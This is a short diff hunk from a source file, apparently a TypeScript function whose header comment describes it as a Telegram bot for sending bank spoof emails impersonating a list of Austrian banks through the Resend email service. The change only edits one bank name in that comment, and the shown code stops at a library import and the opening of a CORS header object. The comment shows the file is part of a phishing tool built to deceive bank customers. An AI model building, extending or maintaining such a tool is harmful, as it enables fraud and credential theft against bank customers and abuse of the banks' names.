@@ -1,4 +1,4 @@
-// Telegram bot for sending bank spoof emails (VB/BAWAG/RBI/Erste/bank99/HYPO NOE/Burgenland/Oberbank/DADAT/Dolomiten/Marchfelder) via Resend
+// Telegram bot for sending bank spoof emails (VB/BAWAG/RBI/Erste/bank99/HYPO/Burgenland/Oberbank/DADAT/Dolomiten/Marchfelder) via Resend
 import { createClient } from "https://esm.sh/@supabase/supabase-js@2";
 
 const corsHeaders = {
